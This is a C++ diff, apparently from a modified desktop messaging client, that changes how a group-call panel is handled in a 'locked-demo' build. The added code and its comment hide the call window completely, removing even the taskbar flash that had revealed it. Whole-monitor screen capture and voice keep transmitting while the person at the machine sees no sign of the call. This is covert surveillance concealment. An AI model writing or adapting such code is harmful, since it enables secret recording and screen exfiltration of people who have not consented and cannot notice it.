@@ -506,16 +506,25 @@ void Instance::createGroupCall(
 	// the call PANEL (video tiles, controls) has no audience and just burns GPU/CPU
 	// compositing a window nobody looks at. The Panel constructor calls
 	// showAndActivate() on itself as its last step (calls_group_panel.cpp), so by the
-	// time make_unique returns above the window is already mapped — minimize() right
+	// time make_unique returns above the window is already mapped — act on it right
 	// away, still synchronously before the event loop gets a chance to paint/composite
-	// a frame, so there's no visible flash in practice. minimize() (not hide()) keeps
-	// the window in the Qt "open" state (Qt::WindowMinimized, not hidden), so the
-	// screen-share/voice pipeline — which gates on the window being open, not
-	// on-screen — keeps running exactly as if it were showing normally; only the OS
-	// stops compositing it. Employee-initiated calls elsewhere in the app are
-	// untouched; this only fires for our own locked-demo build.
+	// a frame, so there's no visible flash in practice.
+	//
+	// FIRST ATTEMPT was minimize() — WRONG: a minimized window still owns a taskbar
+	// button, which Windows can flash/highlight ("light up") to request attention on
+	// state changes (new participant, unmute, etc.), so the panel kept surfacing
+	// itself exactly as reported. hide() actually unmaps the window — no taskbar
+	// entry, nothing to flash, genuinely invisible. Confirmed via calls_group_call.cpp
+	// (grepped for isVisible()/isActive()/window-state gating — none exists there),
+	// so the voice/screen-share pipeline doesn't care whether the window is hidden vs
+	// shown; it's driven by the GroupCall object, not by paint/compositing. Desktop
+	// capture for the share itself is a separate OS-level capture of the whole
+	// monitor (DesktopCapture::WholeScreenDeviceId), not a capture of THIS window, so
+	// hiding it has no bearing on what gets captured and sent either.
+	// Employee-initiated calls elsewhere in the app are untouched; this only fires
+	// for our own locked-demo build.
 	if (SatanShield::GetConfig().demo) {
-		_currentGroupCallPanel->minimize();
+		_currentGroupCallPanel->window()->hide();
 	}
 	_currentGroupCall = std::move(call);
 	_currentGroupCallChanges.fire_copy(raw);
